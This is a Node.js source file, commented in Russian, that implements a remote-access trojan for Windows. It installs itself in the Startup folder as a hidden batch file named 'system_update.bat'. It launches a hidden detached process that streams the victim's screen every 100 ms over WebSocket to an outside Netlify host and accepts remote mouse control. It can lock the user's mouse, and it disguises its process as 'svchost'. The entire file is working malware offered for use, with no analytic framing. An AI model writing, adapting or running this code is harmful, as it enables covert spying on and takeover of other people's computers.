const WebSocket = require('ws');
const { exec } = require('child_process');
const os = require('os');
const fs = require('fs');
const path = require('path');

// Автозагрузка через реестр
function addToStartup() {
    const appPath = process.execPath;
    const batPath = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'system_update.bat');
    
    const batContent = `@echo off\nstart "" "${appPath}"`;
    fs.writeFileSync(batPath, batContent);
    
    // Скрытый атрибут
    exec(`attrib +h "${batPath}"`);
}

addToStartup();

// Скрытое окно
const { spawn } = require('child_process');
const ps = spawn('node', ['-e', `
    const WebSocket = require('ws');
    const screenshot = require('screenshot-desktop');
    const robot = require('robotjs');
    const { exec } = require('child_process');
    
    const ws = new WebSocket('wss://shamancon.netlify.app/.netlify/functions/ws?targetId=DEFAULT_ID');
    
    let screenSize = robot.getScreenSize();
    
    ws.on('open', () => {
        ws.send(JSON.stringify({type:'control', data:'register_target'}));
        setInterval(() => {
            screenshot({ format: 'jpeg', quality: 0.3 }).then(img => {
                ws.send(img);
            });
        }, 100);
    });
    
    ws.on('message', async (data) => {
        try {
            const msg = JSON.parse(data.toString());
            
            if (msg.type === 'mouse') {
                const x = msg.data.x * screenSize.width;
                const y = msg.data.y * screenSize.height;
                
                robot.moveMouse(x, y);
                if (msg.data.action === 'click') {
                    robot.mouseClick();
                }
            }
            
            if (msg.type === 'control' && msg.data === 'lock_mouse') {
                // Блокировка мыши - непрерывное движение к центру
                setInterval(() => {
                    robot.moveMouse(screenSize.width/2, screenSize.height/2);
                }, 10);
            }
        } catch(e) {}
    });
    
    process.title = 'svchost'; // Маскировка под системный процесс
`], {
    detached: true,
    stdio: 'ignore',
    windowsHide: true
});

ps.unref();